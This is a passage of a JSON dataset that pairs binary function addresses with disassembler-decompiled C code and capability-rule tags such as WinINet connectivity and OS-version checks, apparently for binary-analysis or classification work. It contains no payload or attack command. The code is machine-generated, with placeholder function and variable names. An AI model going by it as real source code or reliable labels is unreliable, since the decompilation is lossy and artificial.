fcn.00056ff4(arg1_00);\n                bVar12 = true;\n                goto code_r0x00057695;\n            }\n            goto code_r0x000576a0;\n        }\n    }\n    return;\ncode_r0x00057695:\n    if (!bVar12) {\ncode_r0x000576a0:\n        fcn.000325d8(0x8d378, 0);\n    }\n    goto code_r0x0005754a;\n}\n",
        "token_count": 914
    },
    "00063b80": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00063b80(int64_t **arg1, ulong arg2)\n\n{\n    int64_t **arg1_00;\n    int64_t *piVar1;\n    int32_t iVar2;\n    \n    arg1_00 = *arg1;\n    fcn.00030310(0x8e2d8);\n    iVar2 = fcn.0005cf30(arg1_00, 2);\n    if ((iVar2 == 0) || (piVar1 = *arg1_00,  *(piVar1 + 1) != 0)) {\n        fcn.00030378(0x8e2d8);\n    }\n    else {\n        *(piVar1 + 0xc) = arg2;\n        *(piVar1 + 1) = 1;\n        fcn.00030378(0x8e2d8);\n        (**(**arg1_00 + 0x1c))(arg1_00, arg2);\n        fcn.00063b30(arg1_00);\n    }\n    *arg1 = NULL;\n    return;\n}\n",
        "token_count": 240
    },
    "0005882c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t fcn.0005882c(int64_t arg1, int64_t arg2, ulong arg3, uint8_t **arg4)\n\n{\n    uint8_t uVar1;\n    ulong uVar2;\n    uint8_t **ppuVar3;\n    uint8_t *puVar4;\n    uint8_t uVar5;\n    uint32_t uVar6;\n    uint64_t uVar7;\n    uint64_t uVar8;\n    uint8_t auStackX8 [16];\n    ulong uStackX24;\n    uint8_t **ppuStackX32;\n    int32_t *in_stack_00000028;\n    int64_t in_stack_00000030;\n    uint32_t in_stack_00000038;\n    int32_t aiStack152 [2];\n    uint8_t *puStack144;\n    ulong uStack136;\n    ulong uStack128;\n    int64_t *piStack120;\n    uint8_t *puStack112;\n    uint uStack104;\n    int64_t iStack96;\n    ulong uStack88;\n    uint uStack80;\n    \n    uVar6 = 0;\n    puStack144 = NULL;\n    uStackX24 = arg3;\n    ppuStackX32 = arg4;\n    if (*(arg1 + 0x18) == 0) {\n        if (*(arg1 + 0x1c) == 0) {\n            if (*(arg1 + 0x10) == 0) {\n                uStack136 = *(arg1 + 0x48);\n                uStack128 = 0;\n                uVar8 = fcn.000638cc(arg1 + 0x10, &uStack136, 0, 0);\n                if (uVar8 != 0) {\n                    return uVar8;\n                }\n            }\n            if ((in_stack_00000030 != 0) && (in_stack_00000038 == 0)) {\n                return 0x21590002;\n            }\n            uVar6 = fcn.00063e60(*(arg1 + 0x10), 0);\n            if (uVar6 != 0) {\n                fcn.00063b80(arg1 + 0x10, 0);\n                return uVar6;\n            }\n            *(arg1 + 0x1c) = 1;\n        }\n    }\n    else if (*(arg1 + 0x10) == 0) {\n        if ((in_stack_00000030 != 0) && (in_stack_00000038 == 0)) {\n            return 0x21590002;\n        }\n        fcn.00030310(arg1 + 0x30);\n        if (*(arg1 + 0x10) == 0) {\n            uVar6 = fcn.00063c94(*(arg1 + 8), arg1 + 0x10, 0);\n        }\n        fcn.00030378(arg1 + 0x30);\n        if (uVar6 != 0) {\n            return uVar6;\n        }\n    }\n    ppuVar3 = ppuStackX32;\n    uVar2 = uStackX24;\n    uVar8 = 0x21590064;\n    if (arg2 != 0) {\n        fcn.0006677c(&piStack120, 0);\n        puStack112 = auStackX8;\n        piStack120 = &iStack96;\n        auStackX8[0] = 0x94;\n        uStack104 = 1;\n        uStack80 = 0x94;\n        iStack96 = arg2;\n        uStack88 = uVar2;\n        uVar6 = fcn.00064248(*(arg1 + 0x10), &piStack120, 0);\n        uVar8 = uVar6;\n        if (uVar6 != 0) goto code_r0x00058ae3;\n    }\n    if (in_stack_00000030 != 0) {\n        uVar6 = fcn.00064000(*(arg1 + 0x10), &puStack144, aiStack152, in_stack_00000038);\n        puVar4 = puStack144;\n        uVar8 = uVar6;\n        if (uVar6 == 0) {\n            if ((aiStack152[0] < 1) || (uVar1 = *puStack144,  auStackX8[0] = uVar1,  aiStack152[0] < uVar1 + 1)) {\n                uVar8 = 0x2159000a;\n                goto code_r0x00058ae3;\n            }\n            *ppuVar3 = puStack144 + uVar1 + 1;\n            uVar5 = uVar1;\n            if (0x94 < uVar1) {\n                uVar5 = 0x94;\n            }\n            *in_stack_00000028 = (aiStack152[0] - uVar1) + -1;\n            uVar7 = uVar5;\n            fcn.0006670a(in_stack_00000030, puStack144 + 1, uVar7);\n            fcn.0006677c(uVar7 + in_stack_00000030, 0, 0x94 - uVar7);\n            if (*in_stack_00000028 == 0) {\n                *ppuStackX32 = NULL;\n            }\n            else {\n                puVar4[uVar1] = uVar1;\n                puStack144 = NULL;\n            }\n        }\n        else if ((uVar6 != 0x21590002) && (fcn.00063b80(arg1 + 0x10, 0),  *(arg1 + 0x18) == 0)) {\n            *(arg1 + 0x1c) = 0;\n        }\n    }\n    if (uVar8 == 0) {\n        return uVar8;\n    }\ncode_r0x00058ae3:\n    fcn.00063bf8(*(arg1 + 0x10), puStack144);\n    fcn.00063b80(arg1 + 0x10, 0);\n    if (*(arg1 + 0x18) == 0) {\n        *(arg1 + 0x1c) = 0;\n    }\n    return uVar8;\n}\n",
        "token_count": 1383
    },
    "00058c50": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.00058c50(int64_t *arg1, ulong arg2, char *arg3, int64_t arg4)\n\n{\n    uint32_t *arg2_00;\n    int16_t iVar1;\n    int32_t iVar2;\n    int64_t arg1_00;\n    int16_t *piVar3;\n    uint64_t uVar4;\n    uint64_t arg1_01;\n    int64_t in_stack_00000030;\n    uint32_t in_stack_00000040;\n    \n    arg1_00 = fcn.00030cc4(arg2);\n    if (arg1_00 == 0) {\n        return 0x21590004;\n    }\n    fcn.0006677c(arg1_00, 0);\n    *(arg1_00 + 0x130) = 0xffff;\n    if ((arg3 == NULL) || (*arg3 == '\\0')) {\n        piVar3 = 0x15ef0;\n        uVar4 = arg1_00 - 0x15ece;\n        do {\n            iVar1 = *piVar3;\n            *(uVar4 + piVar3) = iVar1;\n            piVar3 = piVar3 + 1;\n        } while (iVar1 != 0);\n    }\n    else {\n        uVar4 = 0;\n        iVar2 = fcn.00066722(arg1_00 + 0x22, 0x40, 0x11fd8, arg3);\n        if (iVar2 < 0) {\n            *(arg1_00 + 0xa0) = 0;\n        }\n    }\n    arg2_00 = arg1_00 + 0x128;\n    arg1_01 = arg1_00 + 0xe8;\n    if (arg4 == 0) {\n        fcn.000652fc(arg1_01, arg2_00);\n    }\n    else {\n        iVar2 = fcn.00065204(arg4, uVar4 & 0xffffffffffffff00 | in_stack_00000040 & 0xffffffffffffff01, arg1_01, arg2_00\n                            );\n        if (iVar2 != 0) goto code_r0x00058da4;\n    }\n    iVar2 = fcn.000654e0(arg1_00 + 0x22, arg1_01, *arg2_00, arg1_00 + 0x10);\n    if (iVar2 == 0) {\n        if ((in_stack_00000030 != 0) &&\n           (iVar2 = fcn.00065204(in_stack_00000030, arg1_01 & 0xffffffffffffff00 | in_stack_00000040 >> 1 & 1, \n                                 arg1_00 + 0xa2, arg1_00 + 0xe4),  iVar2 != 0)) goto code_r0x00058da4;\n        fcn.0006214c(arg1_00 + 0x138);\n        iVar2 = 0;\n        *arg1 = arg1_00;\n    }\n    else {\n        iVar2 = fcn.00066782(iVar2);\n    }\n    if (iVar2 == 0) {\n        return 0;\n    }\ncode_r0x00058da4:\n    if (*(arg1_00 + 0x10) != 0) {\n        fcn.000666f2();\n    }\n    fcn.00030d24(arg1_00);\n    return iVar2;\n}\n",
        "token_count": 769
    },
    "00059074": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.00059074(int64_t arg1, ulong *arg2, uint *arg3, ulong arg4)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    ulong auStackX8 [4];\n    uint32_t in_stack_00000028;\n    uint auStack56 [4];\n    \n    cVar1 = *(arg1 + 0x20);\n    while( true ) {\n        if (cVar1 != '\\0') {\n            return 0x21590006;\n        }\n        iVar2 = fcn.00062298(auStackX8, auStack56, arg1 + 0x138, arg4);\n        if (iVar2 == 0) {\n            *arg2 = auStackX8[0];\n            *arg3 = auStack56[0];\n            return 0;\n        }\n        LOCK();\n        *(arg1 + 0x160) = *(arg1 + 0x160) + 1;\n        iVar2 = fcn.0002fce4(arg1 + 0x150, in_stack_00000028);\n        LOCK();\n        *(arg1 + 0x160) = *(arg1 + 0x160) + -1;\n        if (iVar2 == 0) {\n            return 0x21590002;\n        }\n        if (iVar2 == -1) break;\n        cVar1 = *(arg1 + 0x20);\n    }\n    return 0xffffffff;\n}\n",
        "token_count": 319
    },
    "00059908": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t fcn.00059908(int64_t arg1, ulong arg2, uint32_t *arg3)\n\n{\n    uint32_t uVar1;\n    uint8_t uVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    int32_t iVar6;\n    uint64_t uVar7;\n    uint32_t *puVar8;\n    uint64_t uVar9;\n    \n    uVar7 = 0;\n    uVar4 = 0;\n    uVar3 = 0;\n    if (arg2 << 3 != 0) {\n        uVar9 = 0;\n        puVar8 = arg3;\n        do {\n            uVar2 = uVar3 & 7;\n            uVar4 = uVar4 | ((*((uVar9 >> 3) + arg1) & 1 << uVar2) >> uVar2) << uVar3 % 0x1c;\n            if (uVar3 % 0x1c == 0x1b) {\n                iVar6 = uVar7;\n                uVar7 = iVar6 + 1;\n                *puVar8 = iVar6 << 0x1c | uVar4;\n                puVar8 = puVar8 + 1;\n                uVar4 = 0;\n            }\n            uVar3 = uVar3 + 1;\n            uVar9 = uVar9 + 1;\n        } while (uVar3 < arg2 << 3);\n    }\n    uVar5 = uVar3 % 0x1c;\n    if (uVar5 != 0x1b) {\n        do {\n            uVar1 = fcn.000667b8();\n            if ((uVar1 & 1 ^ uVar1 >> 0x1f) - (uVar1 >> 0x1f) == 1) {\n                uVar4 = uVar4 | 1 << uVar5;\n            }\n            uVar3 = uVar3 + 1;\n            uVar5 = uVar3 % 0x1c;\n        } while (uVar5 != 0x1b);\n        arg3[uVar7] = uVar7 << 0x1c | uVar4;\n        uVar7 = uVar7 + 1;\n    }\n    return uVar7;\n}\n",
        "token_count": 519
    },
    "00059a04": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.00059a04(int64_t arg1, ulong arg2, uint32_t *arg3, ulong *arg4)\n\n{\n    uint8_t uVar1;\n    int32_t iVar2;\n    int16_t iVar3;\n    int16_t iVar4;\n    int32_t iVar5;\n    uint8_t uVar6;\n    uint32_t uVar7;\n    uint *puVar8;\n    uint8_t *puVar9;\n    uint32_t uVar10;\n    ushort *puVar11;\n    uint64_t uVar12;\n    uint *in_stack_00000028;\n    uint uStack104;\n    uint8_t uStack100;\n    uchar auStack99 [35];\n    \n    iVar2 = arg2;\n    if ((((iVar2 - 0xcU < 0x1f5) && (-1 < *(arg1 + 2))) && ((*(arg1 + 2) & 0x78) == 0)) &&\n       ((iVar3 = fcn.00030df4(),  iVar3 == 1 && (iVar2 != 0xc)))) {\n        uVar6 = *(arg1 + 0xc);\n        if (uVar6 == 0) {\n            return 0;\n        }\n        uVar10 = uVar6;\n        if ((in_stack_00000028 == NULL) || (uVar6 != 10)) {\n            if (uVar6 < 8) {\n                return 0;\n            }\n            if (0x2d < uVar10) {\n                return 0;\n            }\n        }\n        else {\n            iVar5 = fcn.00032bc8(arg1 + 0xd, arg2);\n            if (iVar5 != 0) {\n                *in_stack_00000028 = 1;\n                *arg4 = *(arg1 + 0xd);\n                *(arg4 + 1) = *(arg1 + 0x15);\n                *(arg4 + 10) = 0;\n                return 1;\n            }\n        }\n        if (uVar10 < iVar2 - 0xdU) {\n            uVar7 = 0;\n            if (uVar10 != 0) {\n                puVar9 = arg1 + 0xd;\n                do {\n                    if (((((uVar7 == 8) || (uVar7 == 0xd)) || (uVar7 == 0x12)) || (uVar7 == 0x17)) &&\n                       (uVar7 < uVar6 - 1)) {\n                        if (*puVar9 != 0x2d) {\n                            return 0;\n                        }\n                    }\n                    else {\n                        uVar1 = *puVar9;\n                        if ((uVar1 < 0x30) || (0x39 < uVar1)) {\n                            if (uVar1 < 0x61) {\n                                return 0;\n                            }\n                            if (0x7a < uVar1) {\n                                return 0;\n                            }\n                        }\n                    }\n                    uVar7 = uVar7 + 1;\n                    puVar9 = puVar9 + 1;\n                } while (uVar7 < uVar10);\n            }\n            puVar11 = arg1 + 0xd + uVar6;\n            for (uVar10 = (iVar2 - 0xdU) - uVar10; uVar10 != 0; uVar10 = uVar10 - uVar6) {\n                uVar6 = *puVar11;\n                uVar10 = uVar10 - 1;\n                puVar11 = puVar11 + 1;\n                if (uVar10 <= uVar6) {\n                    return 0;\n                }\n                if (uVar6 == 0) break;\n                puVar11 = puVar11 + uVar6;\n            }\n            if (3 < uVar10) {\n                iVar3 = fcn.00030df4(*puVar11);\n                iVar4 = fcn.00030df4(puVar11[1]);\n                if (((iVar3 == 1) && (iVar4 == 1)) &&\n                   (uVar10 = fcn.00059834(arg1 + 0xd, *(arg1 + 0xc), &uStack104),  4 < uVar10)) {\n                    if (uVar10 != 0) {\n                        puVar8 = &uStack104;\n                        uVar12 = uVar10;\n                        do {\n                            *puVar8 = *puVar8 ^ uStack104._2_1_ >> 1;\n                            puVar8 = puVar8 + 1;\n                            uVar12 = uVar12 - 1;\n                        } while (uVar12 != 0);\n                    }\n                    uVar6 = 0;\n                    uStack104 = uStack104 & 0xff00ffff;\n                    if (uVar10 != 0) {\n                        puVar8 = &uStack104;\n                        uVar12 = uVar10;\n                        do {\n                            uVar6 = uVar6 + *puVar8;\n                            puVar8 = puVar8 + 1;\n                            uVar12 = uVar12 - 1;\n                        } while (uVar12 != 0);\n                    }\n                    if ((uStack104._2_1_ == uVar6) && ((uStack100 & 0x1f) < 0x1a)) {\n                        *arg3 = uStack104;\n                        *(arg3 + 1) = uStack100;\n                        if (arg4 != NULL) {\n                            fcn.0006670a(arg4, auStack99, uStack100 & 0x1f);\n                        }\n                        if (in_stack_00000028 != NULL) {\n                            *in_stack_00000028 = 0;\n                        }\n                        return 1;\n                    }\n                }\n            }\n        }\n    }\n    return 0;\n}\n",
        "token_count": 1272
    },
    "0005a2c4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0005a2c4(int64_t arg1, ulong *arg2, ulong arg3)\n\n{\n    int64_t iVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    \n    if (arg3 == 0) {\n        fcn.00063b80(arg2, 0);\n        if (*(arg1 + 0x2a0) == 0) {\n            return;\n        }\n        *(arg1 + 0x2a8) = 0;\n        *(arg1 + 0x2b0) = 0;\n        return;\n    }\n    fcn.00030310(arg1 + 0x78);\n    if (*(arg1 + 0x2a0) == 0) {\n        iVar2 = *(arg1 + 0x298) + 1;\n        uVar3 = iVar2 >> 0x1f & 0x1f;\n        iVar2 = (iVar2 + uVar3 & 0x1f) - uVar3;\n        if (iVar2 == *(arg1 + 0x29c)) {\n            fcn.00063b80(arg2, 0);\n            goto code_r0x0005a391;\n        }\n        *(arg1 + 0x98 + *(arg1 + 0x298) * 0x10) = *arg2;\n        iVar1 = *0xfffff78000000320;\n        uVar3 = (**0x11308)();\n        *(arg1 + (*(arg1 + 0x298) + 10) * 0x10) = (iVar1 * uVar3) / 10000;\n        *(arg1 + 0x298) = iVar2;\n    }\n    else {\n        *(arg1 + 0x2b0) = 0;\n    }\n    *arg2 = 0;\ncode_r0x0005a391:\n    fcn.00030378(arg1 + 0x78);\n    return;\n}\n",
        "token_count": 436
    },
    "0005ae6c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0005ae6c(int64_t arg1, ulong arg2, ulong arg3)\n\n{\n    int64_t *piVar1;\n    int64_t *arg1_00;\n    int64_t *piVar2;\n    int64_t aiStackX8 [4];\n    \n    aiStackX8[0] = 0;\n    fcn.00032284(arg1 + 0x38);\n    arg1_00 = *(arg1 + 0x30);\n    piVar2 = NULL;\n    if (*(arg1 + 0x30) != NULL) {\n        do {\n            piVar1 = arg1_00;\n            arg1_00 = piVar1;\n            if (*(piVar1 + 1) == arg2) break;\n            arg1_00 = *piVar1;\n            piVar2 = piVar1;\n        } while (arg1_00 != NULL);\n        if (arg1_00 != NULL) {\n            if (piVar2 == NULL) {\n                *(arg1 + 0x30) = *arg1_00;\n            }\n            else {\n                *piVar2 = *arg1_00;\n            }\n            if (arg1_00[3] != 0) {\n                fcn.00063bf8(arg1_00[2], arg1_00[3]);\n            }\n            aiStackX8[0] = arg1_00[2];\n            fcn.00030d24(arg1_00);\n        }\n    }\n    fcn.00032304(arg1 + 0x38);\n    if (aiStackX8[0] != 0) {\n        fcn.0005a2c4(arg1, aiStackX8, arg3);\n    }\n    return;\n}\n",
        "token_count": 385
    },
    "0005bfdc": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t fcn.0005bfdc(int64_t arg1, ulong arg2, ulong arg3, uint32_t *arg4)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint32_t uVar3;\n    ulong *arg1_00;\n    int64_t *piVar4;\n    ulong arg1_01;\n    int32_t iVar5;\n    uint8_t in_stack_00000028;\n    int32_t iStack136;\n    uchar auStack132 [4];\n    ulong uStack128;\n    ulong uStack120;\n    uint32_t uStack112;\n    ulong uStack104;\n    ulong *puStack96;\n    ulong uStack88;\n    \n    iVar5 = 0;\n    arg1_01 = uStack128;\n    do {\n        arg1_00 = fcn.00030c98(0x28);\n        if (arg1_00 == NULL) {\n            return 0x21590004;\n        }\n        fcn.0006677c(arg1_00, 0, 0x28);\n        iVar1 = fcn.0005a10c(arg1, arg1_00 + 2, &iStack136);\n        if (iVar1 == 0) {\n            fcn.00032284(arg1 + 0x38);\n            do {\n                iVar1 = fcn.000667b8();\n                *(arg1_00 + 1) = iVar1;\n                piVar4 = *(arg1 + 0x30);\n                if (piVar4 == NULL) break;\n                do {\n                    if (iVar1 == *(piVar4 + 1)) break;\n                    piVar4 = *piVar4;\n                } while (piVar4 != NULL);\n            } while (piVar4 != NULL);\n            *arg1_00 = *(arg1 + 0x30);\n            *(arg1 + 0x30) = arg1_00;\n            arg1_01 = arg1_00[2];\n            *arg4 = *(arg1_00 + 1);\n            fcn.00032304(arg1 + 0x38);\n            if (iStack136 == 0) {\n                iVar1 = 0;\n            }\n            else {\n                iVar1 = fcn.00063e60(arg1_01, 0);\n                if (iVar1 != 0) {\n                    fcn.0005ae6c(arg1, *arg4, 0);\n                    arg1_01 = 0;\n                    *arg4 = 0;\n                }\n            }\n        }\n        else {\n            fcn.00030d24(arg1_00);\n        }\n        if (iVar1 != 0) {\n            return iVar1;\n        }\n        while (iVar1 = fcn.00064000(arg1_01, &uStack128, auStack132, 0),  iVar1 == 0) {\n            fcn.00063bf8(arg1_01, uStack128);\n        }\n        if (iVar1 == 0x21590002) {\n            uStack120._0_4_ = *arg4;\n            uStack112 = in_stack_00000028 & 0xffffff01;\n            uStack120._4_4_ = arg2;\n            uVar2 = fcn.00030dc8(uStack120);\n            uStack120 = CONCAT44(uStack120._4_4_, uVar2);\n            uVar3 = fcn.00030dc8(uStack120._4_4_);\n            uStack120 = uStack120 & 0xffffffff | uVar3 << 0x20;\n            puStack96 = &uStack120;\n            uStack88 = 0xc;\n            uStack104 = arg3;\n            iVar1 = fcn.00064248(arg1_01, &uStack104, 0);\n            if (iVar1 == 0) {\n                return 0;\n            }\n            fcn.0005ae6c(arg1, *arg4, 0);\n            *arg4 = 0;\n        }\n        else {\n            fcn.0005ae6c(arg1, *arg4, 0);\n        }\n        iVar5 = iVar5 + 1;\n        if (4 < iVar5) {\n            return iVar1;\n        }\n    } while( true );\n}\n",
        "token_count": 946
    },
    "0005c2ec": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0005c2ec(void)\n\n{\n    ulong *puVar1;\n    ulong *arg1;\n    uchar auStackX8 [32];\n    \n    if (*0x8e080 != 0) {\n        fcn.0002fcb8(0x8e058);\n        fcn.00032748(0x8e048, auStackX8);\n        fcn.00032710(0x8e048);\n        fcn.0002fc94(0x8e058);\n        fcn.00032174(0x8e060);\n        arg1 = *0x8e078;\n        while (arg1 != NULL) {\n            fcn.00063b80(arg1 + 2, 0);\n            fcn.00030310(arg1 + 3);\n            fcn.00030378(arg1 + 3);\n            fcn.000302e8(arg1 + 3);\n            puVar1 = *arg1;\n            fcn.00030d24(arg1);\n            arg1 = puVar1;\n        }\n        *0x8e078 = NULL;\n        fcn.000321f4(0x8e060);\n        fcn.00032148(0x8e060);\n        *0x8e080 = 0;\n    }\n    return;\n}\n",
        "token_count": 290
    },
    "0005d194": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t fcn.0005d194(int64_t arg1, int64_t *arg2, uint32_t *arg3, uint64_t arg4)\n\n{\n    uint32_t uVar1;\n    uint64_t uVar2;\n    int64_t iVar3;\n    uint64_t arg4_00;\n    uint auStackX8 [8];\n    uint8_t in_stack_00000028;\n    \n    arg4_00 = arg4 & 0xffffffff;\n    if (*(arg1 + 0x18) == 0) {\n        if (*(arg1 + 0x1c) == 0) {\n            *arg3 = 0;\n            auStackX8[0] = 4;\n            uVar2 = fcn.00062a0c(*(arg1 + 8), arg3, auStackX8, arg4);\n            if (uVar2 == 0) {\n                uVar1 = fcn.00030dc8(*arg3);\n                *arg3 = uVar1;\n                if (uVar1 < 0) {\n                    uVar2 = 0x2159000a;\n                }\n                else {\n                    iVar3 = fcn.00030c98(uVar1);\n                    *arg2 = iVar3;\n                    if (iVar3 != 0) {\n                        if (*arg3 == 0) {\n                            return uVar2 & 0xffffffff;\n                        }\n                        if ((in_stack_00000028 & 1) == 0) {\n                            arg4_00 = 60000;\n                        }\n                        uVar1 = fcn.00062a0c(*(arg1 + 8), iVar3, arg3, arg4_00);\n                        if (uVar1 == 0) {\n                            return uVar1;\n                        }\n                        fcn.00030d24(*arg2);\n                        *arg2 = 0;\n                        *(arg1 + 0x18) = 1;\n                        fcn.000625cc(arg1 + 8, 0);\n                        return uVar1;\n                    }\n                    uVar2 = 0x21590004;\n                }\n                fcn.000625cc(arg1 + 8, 0);\n                *(arg1 + 0x18) = 1;\n            }\n        }\n        else {\n            *arg3 = 0x800;\n            iVar3 = fcn.00030c98(0x800);\n            *arg2 = iVar3;\n            if (iVar3 == 0) {\n                uVar2 = 0x21590004;\n            }\n            else {\n                uVar1 = fcn.00062a0c(*(arg1 + 8), iVar3, arg3, arg4_00);\n                uVar2 = uVar1;\n                if (uVar1 == 0) {\n                    return uVar2;\n                }\n                fcn.00030d24(*arg2);\n                *arg2 = 0;\n            }\n            *arg3 = 0;\n        }\n    }\n    else {\n        uVar2 = 0x21590065;\n    }\n    return uVar2;\n}\n",
        "token_count": 675
    },
    "0005d348": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0005d348(int64_t arg1, int64_t ***arg2, uint64_t arg3)\n\n{\n    int64_t ***pppiVar1;\n    uint64_t arg1_00;\n    ulong arg1_01;\n    uint32_t auStackX8 [8];\n    int64_t ***pppiStack56;\n    uint32_t *puStack48;\n    ulong uStack40;\n    \n    if (*(arg1 + 0x1c) == 0) {\n        arg1_00 = 0;\n        auStackX8[0] = 0;\n        pppiVar1 = arg2;\n        if (arg2 != NULL) {\n            do {\n                auStackX8[0] = arg1_00 + *(pppiVar1 + 2);\n                arg1_00 = auStackX8[0];\n                pppiVar1 = *pppiVar1;\n            } while (pppiVar1 != NULL);\n        }\n        auStackX8[0] = fcn.00030dc8(arg1_00);\n        arg1_01 = *(arg1 + 8);\n        puStack48 = auStackX8;\n        uStack40 = 4;\n        pppiVar1 = &pppiStack56;\n        arg3 = arg3 & 0xffffffff;\n        pppiStack56 = arg2;\n    }\n    else {\n        arg1_01 = *(arg1 + 8);\n        pppiVar1 = arg2;\n    }\n    fcn.00062b80(arg1_01, pppiVar1, arg3);\n    return;\n}\n",
        "token_count": 351
    },
    "0005d778": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.0005d778(int64_t arg1)\n\n{\n    int64_t iVar1;\n    ulong uVar2;\n    \n    iVar1 = fcn.00030c98(0x158);\n    if (iVar1 == 0) {\n        uVar2 = 0x21590004;\n    }\n    else {\n        fcn.0006677c(iVar1, 0, 0x158);\n        fcn.000302c0(iVar1 + 0x118);\n        fcn.000302c0(iVar1 + 0x128);\n        fcn.0002fc18(iVar1 + 0x120);\n        *(iVar1 + 0x10) = *(arg1 + 0x10);\n        uVar2 = *(arg1 + 0x18);\n        *(iVar1 + 0x138) = 1;\n        *(iVar1 + 0x18) = uVar2;\n        fcn.00030310(arg1 + 0x118);\n        *(iVar1 + 0xf0) = *(arg1 + 0x108);\n        if (*(arg1 + 0x108) != 0) {\n            *(*(arg1 + 0x108) + 0xe8) = iVar1;\n        }\n        *(arg1 + 0x108) = iVar1;\n        if (*(arg1 + 0x100) == 0) {\n            *(arg1 + 0x100) = iVar1;\n        }\n        *(arg1 + 0x110) = *(arg1 + 0x110) + 1;\n        *(iVar1 + 0xf8) = arg1;\n        fcn.00030378(arg1 + 0x118);\n        uVar2 = 0;\n    }\n    return uVar2;\n}\n",
        "token_count": 397
    },
    "0005d8a4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.0005d8a4(int64_t arg1, ulong *arg2, uint *arg3, uint64_t arg4)\n\n{\n    int64_t *arg1_00;\n    int64_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    \n    iVar2 = *(arg1 + 0xe0);\n    if (iVar2 == 0) {\n        if (*(arg1 + 8) == 0) {\n            fcn.00030310(arg1 + 0x128);\n            if (*(arg1 + 0xe0) == 0) {\n                iVar2 = 0x21590002;\n                iVar4 = 0;\n                do {\n                    fcn.00030310(arg1 + 0x118);\n                    if (*(arg1 + 200) != 0) {\n                        *arg2 = *(*(arg1 + 200) + 8);\n                        *arg3 = *(*(arg1 + 200) + 0x10);\n                        arg1_00 = *(arg1 + 200);\n                        *(arg1 + 0xd8) = *(arg1 + 0xd8) - *(arg1_00 + 2);\n                        iVar1 = *arg1_00;\n                        fcn.00030d24(arg1_00);\n                        *(arg1 + 200) = 